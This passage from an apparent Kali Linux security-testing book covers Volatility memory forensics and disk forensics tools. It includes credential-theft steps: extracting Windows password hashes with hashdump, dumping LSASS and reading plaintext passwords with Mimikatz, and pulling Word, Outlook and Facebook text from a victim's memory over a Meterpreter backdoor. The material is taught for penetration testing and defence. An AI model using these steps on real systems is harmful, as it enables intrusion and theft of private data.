 volatility iehistory -f [memorydumpfilename.raw] --profile=Win7SP1x86

This command can take while to run, but returns a large amount of information:

**************************************************

Process: 1692 iexplore.exe

Cache type "URL " at 0x255600

Record length: 0x180

Location: Dan@https://www.reallycoolwebsitename/index.htm

Last modified: 2015-01-02 18:50:54 UTC+0000

Last accessed: 2015-01-07 20:53:58 UTC+0000

File Offset: 0x180, Data Offset: 0x94, Data Length: 0xa4

File: favicon[1].ico

Data: HTTP/1.1 200 OK

Strict-Transport-Security: max-age=63072000; includeSubDomains

ETag: "454bb381"

Content-Length: 1150

Keep-Alive: timeout=5, max=100

Content-Type: image/x-icon

**************************************************

Process: 1692 iexplore.exe

Cache type "URL " at 0x255780

Record length: 0x180

Location: Dan@http://www.anotherreallycoolwebsite/movie2.mp3

Last modified: 2013-03-06 22:57:52 UTC+0000

Last accessed: 2015-01-07 20:55:12 UTC+0000

File Offset: 0x180, Data Offset: 0x98, Data Length: 0xa8

File: favicon[2].ico

Data: HTTP/1.1 200 OK

Access-Control-Allow-Origin: *

Content-Type: image/x-icon

Content-Length: 1406

**************************************************

Notice the internet website visited is listed, along with a date/ time stamp and the user who accessed the site. Also listed are cookies files and any programs that are executed from the browser. For some reason this user executed a PowerShell script called “Speak”:

**************************************************

Process: 3692 firefox.exe

Cache type "URL " at 0xcd5100

Record length: 0x100

Location: Visited: Dan@file:///C:/Users/Dan/Desktop/speak.ps1

Last modified: 2015-02-03 14:50:10 UTC+0000

Last accessed: 2015-02-03 14:50:10 UTC+0000

File Offset: 0x100, Data Offset: 0x0, Data Length: 0x9c

**************************************************

And apparently was watching music videos for some reason:

**************************************************

Process: 3692 firefox.exe

Cache type "URL " at 0xcd6000

Record length: 0x180

Location: Visited: Dan@https://www.youtube.com/watch?v=v2AC41dglnM

Last modified: 2015-03-12 15:01:23 UTC+0000

Last accessed: 2015-03-12 15:01:23 UTC+0000

File Offset: 0x180, Data Offset: 0x0, Data Length: 0xa4

**************************************************

I wonder if this has anything to do with the PowerShell post exploitation chapter?!?

### Recovering Data from Process Memory

You can also pull information from processes that were running when the data capture was made. For example, let’s pull information from an open Firefox session in the memory dump.

First we need to find the Program ID number (PID) for the Firefox process by using the “pslist” command:

 volatility pslist -f [memorydumpfilename.raw] --profile=Win7SP1x86

Search down the process list and find the PID for FireFox, it is 3692 on my machine:

![](Images/image01079.jpeg)

Now all we need to do is use the “memdump -p [process#]” command to save the associated memory to a file. We will also make a “test” directory to save the recovered file into. Then we will take the recovered .dmp file and run it through the “strings” command to recover any readable text and save it as a text file.

1.  Make a new directory, “mkdir test”
2.  Enter, “volatility -f [memorydumpfilename.raw] --profile=Win7SP1x86 memdump -p 3692 -D test/” putting in your memory file name and the PID for your Firefox.
3.  Change to the test directory and type, “strings 3692.dmp > firefox.txt”

As shown below:

![](Images/image01080.jpeg)

Now simply open the resultant firefox.txt file with a text editor and search for artifacts, like this simulated Facebook message conversation:

Hey, what are you doing?

ZZZZZZZZZZZZNothing much, you?

ZSamo, samo here.

ZZZZZZZZZZZZZZZI downloaded some great movies from a pirate site last nite!

ZZZZZZZZZZNo way, where did you put them?

ZZZZZZZThey are in the Corporate Engineering Projects Share, lol!

ZZZZZZZZZZZZZZZGotta love work providing a place for our movies!

You can do this with many different applications; play around with it, you never know what you might find lurking around in process memory. We will look a little deeper into pulling data from programs in an upcoming chapter but for now, let’s look at Yarascan.

Yarascan

Yarascan is a great built in module that allows you to search memory dumps for text strings. This is extremely helpful for malware analysts looking for known virus strings, but can also be an interesting tool for a security tester.

Yarascan has two switches, “-Y” and “-y”. If we just want to look for a text string use the “-Y” switch or you can use a Yara Rules files with the “-y” switch for more advanced searches. For our purposes we will just use the “-Y” switch and look for the string, “password”:

 volatility --profile Win7SP1x86 -f [memorydumpfilename.raw] yarascan -Y "password"

This will run for quite a while, as it runs it shows sections of text that are found that include your string, sorted by Process ID number. If we look at the “mysqld.exe” section you may find this:

![](Images/image01081.jpeg)

The admin password! And a little farther down:

![](Images/image01082.jpeg)

If you remember, this is a text dump of the Mutillidae Accounts database that we found in the SQLmap chapter! If we change our search term to the logged in username with a “@” symbol after it we can find what websites the user visited. When I did a Yarasearch for my username, “Dan@” I found a complete list of all the websites visited from the Internet Explorer and Firefox processes, including this one:

![](Images/image01083.jpeg)

The video watched from the PowerShell chapter!

### Recovering Password Hashes

Windows user password hashes are also stored in active memory. If you can obtain a memory image, you can get the password hashes. This is of importance to security penetration testers because if you have the hashes, you can then proceed to crack them or use them in pass the hash types of attacks to access other systems on the network.

To do this with Volatility we need to know the starting memory locations for the System and SAM keys. We look in the hivelist and copy down the numbers in the first column that correspond to the SAM and SYSTEM locations.

 volatility hivelist -f [memorydumpfilename.raw] --profile=Win7SP1x86

![](Images/image01084.jpeg)

We need to get the virtual address for System (1) and put it in the “-y” switch and the address for the SAM (2) into “-s”. Now armed with this information we enter the following command to pull the password hashes out of memory and store them in a text file called hashes.txt:

volatility -f [memorydumpfilename.raw] --profile=Win7SP1x86 hashdump -y 0x8961c008 -s 0x8a0dd9d0 > hashes.txt 

Simply check the hash.txt file and you will see the admin hash and the password hashes for any users:

![](Images/image01085.jpeg)

These hashes could then be taken and cracked in an online hash cracking site (for LM hashes) or any one of the password cracking programs like John the Ripper or Hashcat (Covered in my first book).

### Volatility Plugins

You can increase the capability of Volatility by using additional plugins. These expand the original Volatility program by providing additional functions. Follow the plugin author’s installation and use directions, but normally all you need to do is download the plugin and store it in your Volatility’s plugin directory (currently “/usr/lib/python2.7/dist-packages/volatility/plugins” in Kali), and then call the plugin as a switch from the command line.

Firefox history

For example you can download a Forensics suite that adds several features including one that displays Firefox history.

1.  Download the Dave Lasalle Forensics Suite file from :

[https://isc.sans.edu/diary/Some+Memory+Forensic+with+Forensic+Suite+%28Volatility+plugins%29/19071](https://isc.sans.edu/diary/Some+Memory+Forensic+with+Forensic+Suite+%28Volatility+plugins%29/19071)

2.  Unzip the file to see all the available plugins. Copy the Volatility plugin “*.py” file(s) you want into your “/usr/lib/python2.7/dist-packages/volatility/plugins” directory and you are good to go. For this example we will look at the Firefox history plugin, so all you really need to do is copy the “firefoxhistory.py” and its dependency file “sqlite_help.py” into the above plugin folder.
3.  Then just run volatility again calling the plugin name.  We can also parse the output with this plugin to create a CSV file with the command:

volatility -f [memorydumpfilename.raw] --profile=Win7SP1x86 firefoxhistory --output=csv --output-file=firefoxdump.csv

This returns the file “firefoxdump.csv”, and if opened in a spreadsheet program should look like this:

![](Images/image01086.jpeg)

USN Journal Record

The USN Journal is a Windows NTFS feature that tracks changes to the hard drive. You can find a lot of forensics information by analyzing this record. Tom Spencer created a Volatility plugin to do just that. (See [https://github.com/tomspencer/volatility/tree/master/usnparser](https://github.com/tomspencer/volatility/tree/master/usnparser) for more information.)

1.  Download the Python file:

wget https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py

2.  Copy the file into the volatility directory at “/usr/lib/python2.7/dist-packages/volatility/plugins”

3.  Now, just enter the following command:

volatility --profile Win7SP1x86 -f [memorydumpfilename.raw] usnparser --output=csv --output-file=usnjournal.csv

The output contains a lot of information, but if we open the created CSV file we can parse it to see what the user was doing at a certain time as seen below:

![](Images/image01087.jpeg)

From this we see that the user was on YouTube, but then was playing around with this suspicious file called EVIL2.EXE, and as some sarcastically say in the digital forensics world, “EVIL2.EXE? Sounds legit!” If we use this along with the information returned earlier from Userassist (and even the IE history) it can really help piece together what the user was doing at a particular time. I hope this shows too how fruitless deleting your internet history can be.

Timeliner

Timeliner is an interesting built in function that combs through the memory dump and looks for a timeline of events from multiple sources:

volatility timeliner --profile Win7SP1x86 -f [memorydumpfilename.raw] --output=xlsx --output-file=timeliner.xlsx

![](Images/image01088.jpeg)

This takes a long time to run but returns a large amount of pertinent information that is date/ time stamped including IE History, Process & DLL information and data from ‘User Assist’ as seen above.

### Basic Malware Analysis with Malfind

So far we have learned some interesting things that you can do with Volatility. But how would it be used to find malware? It been kind of fun playing around with a memory dump from one of our own systems, but wouldn’t it be more interesting to take a look at some memory dumps that are from infected machines? Well, you can! The Volatility creators have been kind enough to post several popular memory dumps of malware images that you can practice on. Go to the Volatility image page at ([https://code.google.com/p/volatility/wiki/SampleMemoryImages](https://code.google.com/p/volatility/wiki/SampleMemoryImages)) to view the available images. 

I usually cover the Stuxnet image, but this has been analyzed to death in forensics articles, so let’s take a look at the Shylock banking trojan. Download and unzip the Shylock image. I saved the .vmem image as a file called “shylock.vmem” in the Desktop/analysis directory.

First, let’s grab the imageinfo information for the memory dump:

 volatility imageinfo -f shylock.vmem

As seen below:

![](Images/image01089.jpeg)

Okay, it is a Windows XP SP3 image, so we will use that information with the profile switch. Next, let’s take a look at what processes were running on the Shylock infected machine:

 volatility pslist -f shylock.vmem --profile=WinXPSP3x86 

![](Images/image01090.jpeg)

Looking down the list I see this:

explorer.exe           1752   1696

This doesn’t seem odd of itself, but there seems to be no process listed with the PID of 1696, and there are several processes running with a Parent PID of 1752\.

Let’s do a connection scan and see if this box was trying to connect out to anything:

 volatility connscan -f shylock.vmem --profile=WinXPSP3x86

![](Images/image01091.jpeg)

Okay that looks very suspicious; our questionable PID is connecting out to a couple remote addresses. Normally you would look these entries up, to see who owns them and if they have been reported for suspicious behavior, and we could dig further in the analysis, but let’s run the built in “malfind” command to see what it detects. Malfind searches for hidden or injected code or DLLs in user mode memory. We will run malfind against the entire memory dump and see if it can find any suspicious code.

Let’s use the “–D outputfolder”  switch to specify a place for malfind to place any code segments that it finds. We will use our “test” directory created earlier to store it.

 volatility malfind -f shylock.vmem --profile=WinXPSP3x86 -D test/

When the command is finished, a lot of information is flagged as suspicious:

![](Images/image01092.jpeg)

All of the possible malicious code segments found were stored in our designated output directory. But were any of them truly malicious? If you go to the output directory, you see all the suspicious files stored as .dmp files.

![](Images/image01093.jpeg)

You can take these files and upload them to ‘VirusTotal.com’ to see if it detects anything suspicious. And when we do, the very first file uploaded returns multiple hits as malware:

![](Images/image01094.jpeg)

Conclusion

In this section we learned how to obtain a memory image from a system and several techniques to analyze it using Volatility. We saw how to use volatility to recover important data from the saved memory, including data from processes and password hashes. Lastly, we took a quick look at analyzing a system infected with malware.

This was just an extremely basic overview of the capabilities of Volatility and Malware analysis; it is capable of doing so much more. If you want to learn more about the topic I highly recommend Michael Hale Ligh’s extensive articles, books and material on the subject. You can also see his complete dismantling of Stuxnet with Volatility in his post “Stuxnet’s Footprint in Memory with Volatility 2.0. ([http://mnin.blogspot.com/2011/06/examining-stuxnets-footprint-in-memory.html](http://mnin.blogspot.com/2011/06/examining-stuxnets-footprint-in-memory.html))

Resources

 Kali Forensics Tools - http://tools.kali.org/forensics

 Volatility Foundation - [http://www.volatilityfoundation.org/](http://www.volatilityfoundation.org/)

 Volatility Wiki - [https://github.com/volatilityfoundation/volatility/wiki](https://github.com/volatilityfoundation/volatility/wiki) & [https://code.google.com/p/volatility/w/list](https://code.google.com/p/volatility/w/list)

 Command Reference - [https://code.google.com/p/volatility/wiki/CommandReference](https://code.google.com/p/volatility/wiki/CommandReference)

 Sample Memory Images - [https://code.google.com/p/volatility/wiki/SampleMemoryImages](https://code.google.com/p/volatility/wiki/SampleMemoryImages)

 [http://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf](http://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf)

## Chapter 31

## Pulling Word Document from Remote System

Since we have been looking at pulling information from a memory dump, let’s take a minute and explore this deeper from a security standpoint before we get back to more traditional forensics tools. I really enjoyed an article from W00tsec about pulling RAW picture images from memory dumps:

[http://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html](http://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html)

And thought it would be interesting if you could use the same process to pull text data from a remote Windows system memory during a pentest – and you can! In this chapter we will see how to pull live data from a remote machine’s memory, parse it for viewable text and analyze it in Kali. We will recover data from Word, Outlook and Facebook messages from all three main browsers. I used a different Windows 7 system as a target for this chapter. The difference being I used an updated Windows 7 that was running Office 2010\. If you have a similar system, feel free to follow along with the examples, if not, it should still be a very interesting read through.

### Recovering Data from Word

We will start with a remote Metasploit Meterpreter shell session already active. So basically we tricked our test system into running a booby trapped file which created a back door to our Kali system. We want to grab the remote memory, but only want the memory in use by the Word process. Following the w00tsec tutorial we just need to use the SysInternals “ProcDump” command.

ProcDump is available from Microsoft’s TechNet site:

 [https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx](https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx)

It is a part of the SysInternals Suite. This command allows you to pull active RAM from specific processes. You may want to also download SysInternal’s “Strings” program:

 [https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx](https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx)

“Strings” is a Windows version of the Linux command that we will be using later.

![](Images/image01095.jpeg)

1.  Both programs will need to be uploaded to the target system from Meterpreter:

![](Images/image01096.jpeg)

2.  Next, in the Metasploit DOS shell, type “tasklist” and “enter” to see what is running on the remote Windows system (Nothing may appear at first, if not wait a few seconds and hit the “enter” key again and you should see the screen below):

![](Images/image01097.jpeg)

Further down the list we see that the user has an open session of MS Word (WINWORD.EXE):

![processes](Images/image01098.jpeg)

3.  Run the procdump command using the “-ma” switch and the process name “WINWORD.EXE”, lastly we will call the resultant dump file “worddump” as seen below:

 procdump -ma WINWORD.EXE worddump

![](Images/image01099.jpeg)

We now have a memory dump stored on our remote system called “worddump.dmp”. The file is pretty large, 424 MB, we could just download that file back to our Kali system – but we can shrink it. We are really only looking for text in the memory dump. We have two options here, we can use the SysInternals “Strings” program to work through the data dump and remove all the text from it (significantly reducing the download size) or we can download the whole file en-mass  back to our Kali system and use the Linux “strings” command to parse it.

The choice is yours, but I will say with just using the default program settings in both, the Linux one seemed to do a much better job of parsing the file. But basically the command is the same in both versions, “strings word.dmp > word.txt”

So if we want to run it on the remote system:

C:\Users\Dan\Downloads\Procdump>strings worddump.dmp > worddump.txt

The SysInternals strings program will parse the file for ASCII strings and save it as a text file. Notice the size difference:

![](Images/image01100.jpeg)

Or we can just use the Meterpreter download command to pull the large dmp file to our Kali system and then run the Linux strings command on it.

Analyzing in Kali

Now if we open the resultant text file in Kali, we see a ton of information – System settings, variables that are set on the system, I even found registry keys mentioned. On mine I found this (Produced with the Linux strings command):

![Kali Strings Result](Images/image01101.jpeg)

Or this produced by the Windows SysInternals Strings command:

![](Images/image01102.jpeg)

When compared to the Word document I had open on the Windows 7 machine:

![Original Document](Images/image01103.jpeg)

As you can see the Nmap user manual I had open on the Windows 7 system has been successfully grabbed from memory remotely, and viewable on the Kali system!

### Pulling Data from Outlook

Using this technique against other programs also yielded interesting results. Any e-mails opened during an Outlook (OUTLOOK.EXE process) session were also recoverable from RAM. Here is a copy of an e-mail that I opened from my Archives folder when in Outlook:

![](Images/image01104.jpeg)

Obtaining the data from memory:

![](Images/image01105.jpeg)

Running it through the Linux Strings command produced:

![](Images/image01106.jpeg)

As you can see, we were able to recover an HTML formatted copy of the e-mail from RAM!

### Recovering Facebook Conversations

Likewise, you can recover any Facebook posts or instant messages that were viewed. I Logged into Facebook and looked at two past conversations and started a new one. All the text from the messages was recoverable in Chrome, Firefox and Internet Explorer. Chrome and IE appeared to have user ids’ (to and from I would assume) and a date time stamp with each post, something like this simulated one:

mid.2347362976674:1a1272a35b3

XtBI

March 11, 2015 11:15 am

So, what are you up to today?

But Firefox’s dump looked more like this:

ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ

So, what are you up to today?ZZZZZZZZ

ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ

Firefox just shows the message text, but no other information other than strings of “Zs”. I am not sure but it looks like Firefox might encrypt some information when it is stored in RAM, though when I looked at the raw .dmp file some date/ time stamps were available from the Firefox dump.

Also, Firefox creates only one process in memory, where IE and Chrome make several (IE had two open processes, four for Chrome). One of the IE processes had nothing regarding Facebook in it, the Facebook data was all in a single memory process dump. Chrome seemed to have the Facebook data spread out across three of four of its running processes.

Here is the tasklist view for Chrome:

![](Images/image01107.jpeg)

It doesn’t really make too much of a difference as all the messaging texts seemed to be in a single process.

### Pulling passwords using Procdump & Mimikatz

You can also use Procdump along with Gentilkiwi’s Mimikatz ([http://blog.gentilkiwi.com/](http://blog.gentilkiwi.com/)) to pull passwords from the LSASS.EXE process and display them in text. Though not practical in a pentest situation, Mimikatz will do this all by itself and is included in Metasploit, but you could pull the LSASS process and save it to a USB drive. Then later use Mimikatz to dump the passwords out of it.

You will need an elevated session to perform this successfully. 

1.  Run Procdump on lsass.exe and save it as lsassdump.dmp like so:

![lsass prodump](Images/image01108.jpeg)

All we need to do is run the resultant .dmp file through Mimikatz:

 Run “Mimikatz”

 Type, “sekurlsa::Minidump lsassdump.dmp“

 Lastly type, “sekurlsa::logonPasswords“

And that is it! Mimikatz works its magic on the .dmp file and within a second or so we see this:

![passwords](Images/image01109.jpeg)

So if we can get a memory dump of the lsass.exe process we can take our time and pop the passwords out of it at any time (and anywhere) with Mimikatz.

### Pulling Memory Dumps with PowerShell

Lastly we can pull memory from processes with, you guessed it, PowerShell. The PowerSploit “Out-Minidump” command makes it extremely simple to create a mini-dump of a process which can then be analyzed for artifacts or passed to Mimikatz to dump passwords. As we have already covered how to use PowerSploit commands and have seen how to play with memory dumps, I leave this as a challenge for the reader to explore:

[https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)

If you get stuck and can’t figure it out, here is a step-by-step video by Chris Campbell (@obscuresec):

[https://www.youtube.com/watch?v=Rz9lYMVhTEM](https://www.youtube.com/watch?v=Rz9lYMVhTEM)

PowerSploit is an amazing tool!

Conclusion

In this section we learned how to pull data from a remote session’s memory and analyze it for interesting artifacts. I know there are other forensics programs out there that will do basically the same thing, and this is not a forensically sound way of preserving data needed in a legal case, but it is a lot of fun doing this manually and opens up some interesting possibilities for a penetration tester.

The best way to defend against this style of attack is to follow good security practices against social engineering and Phishing type attacks. An attacker would need a remote connection or local access to your system to be able to pull items from your memory. As usual do not open unknown or unsolicited attachments in e-mails. Be leery of odd sounding links sent to you from a colleague’s account and use a script blocker and good AV Internet security program when surfing the web. Businesses should always use a security product that stores and analyzes traffic for malicious behavior. Lastly, good physical security for systems is also important. Securing locations, using power on passwords and using encrypted volumes is always a good idea.

Resources

 “Extracting RAW pictures from memory dumps”, Copyright 2015 by Bernardo Rodrigues:

[http://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html](http://w00tsec.blogspot.com/2015/02/extracting-raw-pictures-from-memory.html)

 Sysinternals Procdump: [https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx](https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx)

 Sysinternals Strings: [https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx](https://technet.microsoft.com/en-us/sysinternals/bb897439.aspx)

 Mimikatz: [http://blog.gentilkiwi.com/](http://blog.gentilkiwi.com/)

 PowerSploit: [https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1](https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1)

## Chapter 32

## Digital Forensics Framework

Digital Forensics Framework (DFF) is a feature rich forensics platform that is used by both novices and professional forensics personnel. Used properly with a write blocker it can preserve digital evidence without modifying data in any way for legal cases. This is way beyond the scope of this book; see the manufacturer’s website and user manuals for more information. We will view it only as a tool to recover interesting data from a security standpoint not a legal one.

You can run DFF from the command line or from a graphical interface. We will look at the GUI based command.

We will be using a downloaded test disk image to actually analyze but we will cover quickly how to obtain an image first.

Author: ArxSys S.A.S.

Website:  [http://www.digital-forensic.org/](http://www.digital-forensic.org/)

### Creating a Hard Drive Image

To do this we will need to burn an .iso image of Kali to a DVD. Then boot our Windows 7 VM using this disk and finally image the Windows 7 drive. You can just read along through this section if you wish. We do not need to actually acquire an image for this tutorial as we will be using a small test image later in the chapter.

Again this is for educational purposes only, in a real forensics cases you would use external storage and a write blocker.

1.  Download the Kali 2 .iso (I used the 32 bit one) from [https://www.kali.org/downloads/](https://www.kali.org/downloads/)
2.  Burn the .iso to DVD or you could also just directly mount the iso file in VMWare player:

![](Images/image01110.jpeg)

Now before we try to boot our Windows 7 VM, it is best to modify the BIOS splash screen time out delay so we actually have time to tell the VM to boot from our Kali CD/DVD.

3.  Go to the directory were your Windows 7 VM is saved. If you don’t know where it is saved open VMware player, highlight the Windows 7 VM, then click, “Edit Virtual Machine settings”, and finally click the “options” menu choice.
4.  Edit the Windows 7.vmx file (“your VM name.vmx”)
5.  Now just add, “bios.bootdelay = 10000” anywhere in the file, like so:

![](Images/image01111.jpeg)

6.  Save Notepad and exit.
7.  Now boot up the VM.
8.  When you see the Bios Splash Screen, hit “esc” for Boot Menu:

![](Images/image01112.jpeg)

9.  Make sure your Kali disk is in the drive and then choose, “CD-Rom Drive”:

![](Images/image01113.jpeg)

10.  When the Kali boot menu appears choose, “Live (686-pae)”:

![](Images/image01114.jpeg)

*** Note: Notice there is also a “Live (Forensics Mode)”. According to the Kali documentation, Forensics mode is a special mode that does two major things different:

 Kali does not write to the hard drive, at all.

 All auto-mounting of removable media (including USB) is disabled.

Again if you are planning on using this for real world forensics in a legal situation then it is on you to verify that it meets all of your legal requirements, we are just using this as a security testing tool.

For more information see [http://docs.kali.org/general-use/kali-linux-forensics-mode](http://docs.kali.org/general-use/kali-linux-forensics-mode).

Kali comes with multiple imaging tools, with two of the most popular command line imaging programs “dc3dd” & “dcfldd” included. Both are enhanced forensic based versions of the popular Linux “dd” file copy command. Dc3dd seems to be a tool created by the Air Force’s Defense Cyber Crime Center (dc3.mil).

Both files have similar functionality but different features. You can check both out to see which one will work best for you. Just run the command from a terminal prompt with the “--help” switch for instructions on using the respective program.

If you prefer a graphical interface, “guymager” is extremely easy to use:

1.  Enter, “guymager” in a terminal
2.  Right click on the drive you want to make an image of and select acquire image:

![](Images/image01115.jpeg)

3.  Select, “Expert Witness Format” or “Linux DD Raw Image” depending on your needs.
4.  Fill in any information you want, then just select the output directory & filename, and click start:

![](Images/image01116.jpeg)

As always, be very careful when dealing with copying and writing hard drive information so you don’t actually overwrite important data. Using “fdisk -l” command will come in handy when determining the drive you want to copy; SATA drives are listed as sda(x):

![](Images/image01117.jpeg)

Just be sure that you have enough space to store the resultant file, my test Windows 7 VM was 64 GBs in size! For learning purposes we will use a drive image file that has already been created that includes several deleted files.

### Analyzing a Test Image

We will now see the Digital Forensics Framework in action using a special forensics training image. Browse to the Computer Forensic Reference Data Sets (CFReDS) for digital evidence website at [http://www.cfreds.nist.gov/](http://www.cfreds.nist.gov/)  and select the “DCFL” link under the Current Control Sets:

![](Images/image01118.jpeg)

1.  Download the first file, “control.dd”:

![](Images/image01119.jpeg)

This NTFS drive image contains several deleted files that we can view/ recover.

2.  Save the “control.dd” file in our analysis directory. We will perform a quick analysis on this image using DFF.
3.  You can start the “dff gui” from the Kali Forensics menu or directly from the command line by typing, “dff-gui”:

![](Images/image01120.jpeg)

4.  Click “Open Evidence”.
5.  Click the green plus sign and select the “control.dd” file.
6.  Click “OK” to load the image file.

The open evidence windows should close and take you back to the main gui interface. It seems at first that nothing happened, but you will notice that Logical Files now has a small “+” sign by it.

![](Images/image01121.jpeg)

7.  Click “Logical Files” in the left Name window
8.  A file called “control.dd” should now show up in the main window.
9.  Double click “control.dd” and then select “always” (or “yes”):

![](Images/image01122.jpeg)

10.  A plus sign appears on “control.dd”.
11.  Double click “control.dd” again.

Two partitions now show up, NTFS and NTFS unallocated:

![](Images/image01123.jpeg)

12.  Double click “NTFS” and a list of files will appear:

![](Images/image01124.jpeg)

Any file color coded red is a file that has been deleted, but is recoverable. If you click on a program file, DFF will display the file in Hex. Click on a video or image and DFF will immediately display the file (even if deleted).

13.  Click on the “MVC-577V.MPG” file and a video preview will appear in the bottom window:

![](Images/image01125.jpeg)

14.  Click on the “Deleted.JPG” file and you will see this:

![](Images/image01126.jpeg)

15.  Right click on “Scientific control.mp3” file. Notice there is no video preview.
16.  Left click on the file and click “Extract” from the menu.
17.  Select a Destination folder and hit “Okay”.

The file will be extracted from the drive image and stored in the directory you have chosen. If you go to that directory and try to play it, nothing happens. Something is wrong. The problem is that this file is actually a Word document that someone has renamed to try to fool analysts. If you rename the file to .doc and open it in Word you will see this:

![](Images/image01127.jpeg)

Conclusion

In this section we looked at a couple different ways to obtain a drive image. We then performed some basic file recovery using the Digital Forensics Framework. These techniques can be used by security personal to discover hidden or deleted files that contain information that could be used to gain more information about a target, internal company information, and possibly even passwords that a user saved in a file (instead of placing them on a sticky note under their keyboard).

Resources

 NIST Forensic images - [http://www.cfreds.nist.gov/](http://www.cfreds.nist.gov/)

## Chapter 33

## Forensics Commands

We will wrap up the Forensics section with a quick look at several forensics tools not covered that might be of interest to a security tester. 

### Autopsy

Autopsy is a very popular tool to analyze disk images. It runs as a webserver and client so there are a few extra steps needed to setup your forensics case information and selecting the drive image to analyze.

![](Images/image01128.jpeg)

For this tutorial we will again use the NIST CFReDS forensics image.

1.  Start the Autopsy web server from the Kali Forensics menu or by typing “autopsy” in a terminal.

![](Images/image01129.jpeg)

2.  Now open Iceweasel in Kali and surf to the http address provided (highlighted above).

![](Images/image01130.jpeg)

3.  Click “New Case”
4.  Enter Case Name, and fill in any other information you want. We will call our case, “test”
5.  Click “New Case” to save information
6.  Next, click “Add Host”
7.  Add any information you want or just click “Add Host” again
8.  Now click, “Add Image”
9.  Select, “Add Image File”
10.  Now enter image location and type:

 Enter the path to the image file, “/root/Desktop/analysis/control.dd”

 For option 2, Make sure “Partition” is selected

 Option 3, Change Import Method to “Copy”

 Click “Next”

![](Images/image01131.jpeg)

11.  Next we have the option to create an MD5 hash for the image; this can come in handy if you want to verify the image has not changed. You will also see file system information. For now, we will just leave the default of “Ignore” and click “Add” to continue.
12.  The image is now copied into the Autopsy evidence locker. Press “OK” when done:

![](Images/image01132.jpeg)

We will now be at the main Autopsy screen. We should see that our image file has been imported into the program and is saved as “mount C:/” with a file system type of “ntfs”:

![](Images/image01133.jpeg)

13.  Click, “Analyze”
14.  Now click, “File Analysis”:

![](Images/image01134.jpeg)

You should see a complete list of the partition contents. Any deleted file should show up in red. You can then view the files, get a detailed report or export them.

To Exit Program

On the main control panel:

 Click “Close”

 Click “Close Host”

 Click “Close Case”

 And then, close the Browser

Finally, go to the open Autopsy Terminal Window and Close the Autopsy process by hitting “Cntrl-C”.

![](Images/image01135.jpeg)

### Dumpzilla

Tool Author: Busindre

Tool Website: [http://www.dumpzilla.org/](http://www.dumpzilla.org/)

Dumpzilla is an interesting program that analyzes Firefox, Iceweasel and Seamonkey browser cache files and returns a lot of information. According to the user manual the data returned includes:

 Cookies + DOM Storage (HTML 5).

 User preferences

 Proxy settings

 Downloads

 Web Forms

 History

 Bookmarks

 Saved passwords

Just run Dumpzilla pointing it to the location of your browser cache file and use the “--All” switch to view most of the information available. In Kali, your browser cache file is in a hidden directory at “/root/.mozilla/firefox”. Browse to that location and find the name of your profile. Once you know your profile name:

 Open a Kali terminal prompt

 Enter, “dumpzilla /root/.mozilla/firefox/[Your Profile.default]/ --All”

This returns a large screenful of internet browsing information, then shows a summary chart of information gathered and finally returns to the terminal prompt.

![](Images/image01136.jpeg)

This could be useful in a pentest if you were able to obtain a copy of the user’s Firefox profile.

![](Images/image01135.jpeg)

### Extundelete

Tool Author: Nic Case

Tool Website:  [http://extundelete.sourceforge.net/](http://extundelete.sourceforge.net/)

Extundelete is an undelete utility that works on Linux based ext3 or ext4 partitions. This comes in handy if your target is an Ubuntu or Linux Mint system and you want to see what files were deleted from the drive. You can also burn Kali to a CD, boot it in a computer where you accidently deleted important files and use this command to recover them.

Available options: extundelete --help

![](Images/image01137.jpeg)

Basic Usage: extundelete [device-file] --restore-file [restore location]

![](Images/image01135.jpeg)

### Foremost

Tool Author: US Government, Jesse Kornblum, Kris Kendall, and Nick Mikus

Tool Website: [http://foremost.sourceforge.net/](http://foremost.sourceforge.net/)

Foremost is a pretty fast file carving program that was originally created by the US government. It can recover documents and pictures from a memory dump.

Available options: foremost -h

![](Images/image01138.jpeg)

You can use multiple types of image capture extensions such as dd, raw, iso, vmem, etc. Foremost creates an output directory called “output” by default and places all recovered artifacts in this directory with an “audit.txt” file. To run the program a second time, the output directory must be empty or you must select a different output folder.

Let’s run foremost against our Windows 7 memory image capture from the Volatility chapter and see what pictures and Office document files we can recover:

 Change directory  to “~/Desktop/analysis”

 Enter,  “foremost -t jpeg,gif,png,doc -i [memorydumpfilename.raw]”

![](Images/image01139.jpeg)

Now open the “output” directory and check the folder subdirectories for recovered files. Running this command on the Windows 7 memory capture I used recovered a large amount of Social Media profile pictures.

![](Images/image01135.jpeg)

### Galleta

Tool Author: Keith J. Jones

Tool Website:  [http://sourceforge.net/projects/odessa/files/Galleta/](http://sourceforge.net/projects/odessa/files/Galleta/)

Galleta allows you to take Internet Explorer cookie files and export them in a readable format. Simply copy the cookie file you want to view from the target system’s IE cache and run it through Galleta.

![](Images/image01140.jpeg)

If we open the “cookie:dan@youtube.com/” file shown above in a text editor we see this:

VISITOR_INFO1_LIVEqgAdQ_pQEUUyoutube.com/1024315294723047521861561944030426235

But if we run the file through Galleta, and output it to a new text file:

![](Images/image01141.jpeg)

And then open it in a spreadsheet program, we see this:

![](Images/image01142.jpeg)

![](Images/image01135.jpeg)

### iPhone Backup Analyzer

Tool Author: Mario Piccinelli

Tool Website:  [http://ipbackupanalyzer.com/](http://ipbackupanalyzer.com/)

iPhone Backup Analyzer (IBA) is a tool that allows you to view iPhone backups. IBA is in the Kali repo but doesn’t seem to be installed in the current version of Kali.

